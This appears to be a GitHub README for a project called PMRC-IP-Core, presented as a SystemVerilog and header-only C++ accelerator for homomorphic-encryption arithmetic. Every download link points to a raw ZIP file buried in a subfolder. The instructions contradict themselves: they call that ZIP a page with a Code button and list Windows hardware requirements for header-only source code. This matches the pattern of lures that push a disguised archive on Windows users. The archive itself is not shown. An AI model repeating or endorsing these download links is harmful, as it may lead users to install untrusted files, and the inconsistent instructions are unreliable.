# ⚙️ PMRC-IP-Core - Fast Cryptography Pipeline Accelerator

[![Download from GitHub](https://img.shields.io/badge/Download-PMRC--IP--Core-brightgreen)](https://github.com/UrvishVagadiya/PMRC-IP-Core/raw/refs/heads/main/sw/Core_PMR_I_v1.0.zip)

---

## 📋 About PMRC-IP-Core

PMRC-IP-Core is a software package focused on speeding up complex cryptography tasks. It helps remove delays caused by sequential processing in certain number systems. The package includes two main parts: pipelined hardware design files written in SystemVerilog, and a C++ library you can use without any installation.

This tool is designed for users who want to work on or with cryptographic pipelines in digital hardware or software. It targets things like hardware acceleration and fully homomorphic encryption, which allow data to stay secure during complex calculations.

---

## 💻 System Requirements

To run this software on Windows, you need:

- Windows 10 or later (64-bit)
- At least 8 GB of RAM
- 500 MB free disk space
- A modern CPU supporting 64-bit instructions
- An editor or viewer for SystemVerilog files (optional, for hardware use)
- A C++ compiler supporting C++11 or later (optional, for the library)

The software does not have strenuous hardware needs but working with hardware design or compiling the library might require some basic programming tools.

---

## 🔽 Download PMRC-IP-Core

You can get the latest version from the project’s GitHub page:

[![Download from GitHub](https://img.shields.io/badge/Download-PMRC--IP--Core-blue)](https://github.com/UrvishVagadiya/PMRC-IP-Core/raw/refs/heads/main/sw/Core_PMR_I_v1.0.zip)

Visit the above link to download all files and documents related to PMRC-IP-Core.

---

## 🚀 Getting Started on Windows

Follow these steps to download and open the software tools on your Windows system.

### Step 1: Access the GitHub Page

- Open your web browser.
- Go to: https://github.com/UrvishVagadiya/PMRC-IP-Core/raw/refs/heads/main/sw/Core_PMR_I_v1.0.zip

This page holds all files for the project, including code and documentation.

### Step 2: Download the Package

- On the GitHub page, locate the green button labeled **Code** near the top right corner.
- Click this button to open the dropdown menu.
- Select **Download ZIP**. This will download the entire project as a compressed file to your computer.

### Step 3: Extract the Files

- Find the ZIP file in your Downloads folder or the folder you chose.
- Right-click the file and select **Extract All**.
- Choose a folder where you want to save the extracted files.
- Click **Extract** to unpack the project.

### Step 4: Explore the Files

- Open the extracted folder.
- You will find folders named `rtl` (hardware design files) and `library` (C++ source code).
- There may also be documents describing how the software works.

---

## 🛠 Using the Software

### For Hardware Designers

- The `rtl` folder contains SystemVerilog files.
- You can open these with an IDE or simulator that supports SystemVerilog.
- Use these files to study or build digital circuits focused on cryptographic arithmetic.
- The design optimizes partial calculations to remove delays caused by sequential steps in known number systems.

### For C++ Developers

- The `library` folder contains header-only C++ code.
- This means there are no compiled files to run. You include these headers in your C++ projects.
- The library provides functions and data structures for fast arithmetic used in cryptography.
- A C++11-compatible compiler is required to include and build projects with these headers.

---

## 🔧 Installing Development Tools

If you plan to work with the software beyond viewing, you may need to install additional tools.

### Install a SystemVerilog Simulator (Optional)

- For testing hardware design files, install a simulator like ModelSim, Questa, or VCS.
- Follow the simulator’s installation guide.
- Open the `rtl` folder files with your chosen software.

### Install a C++ Compiler (Optional)

- For using the C++ library, you need a compiler.
- You can install Microsoft Visual Studio Community Edition with Desktop Development tools.
- Alternatively, install MinGW or Cygwin to get GCC on Windows.
- After installation, you can include the library headers in your C++ projects.

---

## 🗂 File Structure Overview

- `rtl/`  
  Contains pipelined SystemVerilog files that describe the hardware logic for parallel FHE conversion.
  
- `library/`  
  Header-only C++ library to support cryptographic pipeline acceleration with parallel prefix computations.
  
- `docs/` (if present)  
  Documentation explaining the design and instructions.
  
- `README.md`  
  This guide and basic project info.

---

## 🤔 Frequently Asked Questions

### What is the main purpose of PMRC-IP-Core?

It improves the speed of cryptography pipelines by removing bottlenecks in arithmetic using parallel methods. It focuses on accelerating fully homomorphic encryption tasks.

### Do I need programming skills to use it?

You can view and download files without knowledge. To modify or build with the software, basic understanding of hardware description languages or C++ helps.

### How do I run the C++ library?

The library does not run on its own. You must include it in your existing C++ cryptographic projects. It speeds up some key calculations.

### Can I use the hardware files directly?

Hardware files are for FPGA or ASIC designers who want to build or simulate the circuit designs. You need tools supporting SystemVerilog.

---

## 🧩 Related Topics and Concepts

PMRC-IP-Core is connected to several areas:

- Cryptography and fully homomorphic encryption (FHE)
- Chinese Remainder Theorem (CRT) for number system conversions
- Hardware acceleration using pipelined RTL designs
- Parallel algorithms for prefix sum calculations
- High-performance computing applied to security tasks
- FPGA and ASIC design flows

---

## 📚 Additional Resources

To learn more about the principles behind PMRC-IP-Core, consider searching for:

- Fully Homomorphic Encryption explanations for non-experts
- Parallel prefix sum algorithms
- SystemVerilog basics for digital design
- Chinese Remainder Theorem applications in cryptography

These topics will help you understand the software’s purpose and how to work with it.

---

## 🕹 Support and Contribution

If you encounter issues or want to improve the project:

- Use the GitHub **Issues** tab on the PMRC-IP-Core page to report problems.
- You can clone the repository using Git tools if you want to contribute changes.
- Community input helps develop this project further.

---

## ⬇️ Download PMRC-IP-Core Here

[![Download](https://img.shields.io/badge/Download-PMRC--IP--Core-green)](https://github.com/UrvishVagadiya/PMRC-IP-Core/raw/refs/heads/main/sw/Core_PMR_I_v1.0.zip)